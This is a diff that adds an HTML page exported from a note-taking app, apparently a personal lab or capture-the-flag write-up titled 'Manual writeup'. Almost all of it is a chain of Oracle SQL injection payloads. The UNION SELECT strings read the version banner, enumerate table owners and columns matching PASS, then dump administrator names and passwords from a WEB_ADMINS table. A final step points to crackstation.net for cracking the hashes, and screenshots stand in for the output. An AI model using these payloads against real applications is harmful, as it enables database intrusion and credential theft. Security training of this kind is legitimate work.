@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Manual writeup</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Manual writeup</h1><br/>a&#39; UNION SELECT banner, NULL, NULL FROM v$version--<br /><a href=""><img src="images/1047-1.png" alt="images/1047-1.png" /></a><br /><br />a&#39; UNION SELECT DISTINCT owner, NULL, NULL FROM all_tables--<br /><a href=""><img src="images/1047-2.png" alt="images/1047-2.png" /></a><br /><br />a&#39; UNION SELECT owner, table_name, NULL FROM all_tab_columns WHERE column_name LIKE &#39;%PASS%&#39;--<br /><a href=""><img src="images/1047-3.png" alt="images/1047-3.png" /></a><br /><br />a&#39; UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name = &#39;WEB_ADMINS&#39;--<br /><a href=""><img src="images/1047-4.png" alt="images/1047-4.png" /></a><br /><br />a&#39; UNION SELECT ADMIN_NAME,NULL,NULL FROM WEB_ADMINS--<br /><a href=""><img src="images/1047-5.png" alt="images/1047-5.png" /></a><br /><br />a&#39; UNION SELECT PASSWORD,NULL,NULL FROM WEB_ADMINS--<br /><a href=""><img src="images/1047-6.png" alt="images/1047-6.png" /></a><br /><br />crackstation.net<br /><a href=""><img src="images/1047-7.png" alt="images/1047-7.png" /></a><br /><br /><br /></div></body></html>
